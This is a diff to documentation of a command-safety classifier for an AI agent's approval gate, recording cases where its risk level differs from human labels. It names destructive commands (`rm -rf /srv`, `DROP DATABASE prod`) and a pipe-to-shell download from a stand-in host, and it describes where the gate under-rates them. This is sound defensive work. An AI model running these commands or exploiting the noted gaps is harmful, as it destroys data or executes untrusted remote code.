@@ -234,7 +234,10 @@ at least one mode.
 | `cat <<EOF` … `don't $(find …) isn't` … `EOF`    | extra `high-risk-other` (label: `recursive-rm`, `inline-code`) | An unquoted heredoc body expands `$(…)`; the expanded substitution is surfaced as its own segment whose only token is the raw substitution, and that segment draws the marker (audit R10 H2).      |
 | empty backtick substitution before `rm -rf /srv` | extra `high-risk-other` (label: `recursive-rm`, `inline-code`) | An empty substitution in the command-word position cannot name a program statically; the flattened form supplies `recursive-rm`, the unanalyzable word supplies the marker (audit R11 SEC-CQ11-1). |
 
-Risk-level calibration notes:
+Risk-level calibration notes — all seven risk-level divergences. The count and the presence of
+every command below are pinned by `inv-safety-bench-published.test.ts` against the live bench, so
+this list can no longer fall behind the harness (an earlier revision listed three of the seven
+while calling itself complete):
 
 - `psql -c 'DROP DATABASE prod'` classifies as risk `low` while the `db-drop` **category still
   fires**. An earlier revision of this document called that "not a safety gap" and said the gate
@@ -245,12 +248,18 @@ Risk-level calibration notes:
   recorded here as a real gap rather than a calibration note. `DROP TABLE` and `TRUNCATE` rate
   `high` and are carded normally; `DROP DATABASE` — the least reversible of the three — is the one
   that slips, which is the wrong way round. Tracked for correction rather than left implicit.
-- `find … -exec rm {} ;` classifies as `medium` rather than `high`; it is still gated
-  (`recursive-rm`).
+- `find /var/tmp -type f -exec rm {} ;` classifies as `medium` rather than `high`; it is still
+  gated (`recursive-rm`).
 - `ssh host 'wget -qO- https://x.example/y | sh'` classifies as `medium` (`inline-code`) where the
   human label says `high`: the quoted script is classified as inner code and gates because that
   inner code pipes a download into `sh`, but the classifier does not escalate a remote pipe-to-shell
   above the inline-code floor. It is carded in both modes; the divergence is the severity word.
+- Four vectors rate `high` where the human label says `low`: `grep -rn 'DROP TABLE' migrations/`,
+  `echo 'see the production runbook'`, `cat docs/migrate-guide.md`, and
+  `dd if=backup.iso of=restore.iso bs=4M`. Each is the risk-level face of a category false positive
+  already listed in the table above (a keyword literal firing on a search argument, prose, a
+  filename, or a file-to-file copy), and each draws an approval card under ordinary approval — a
+  safe-direction over-gate, not a miss.
 
 ## External corpus cross-evaluation (gitleaks)
 
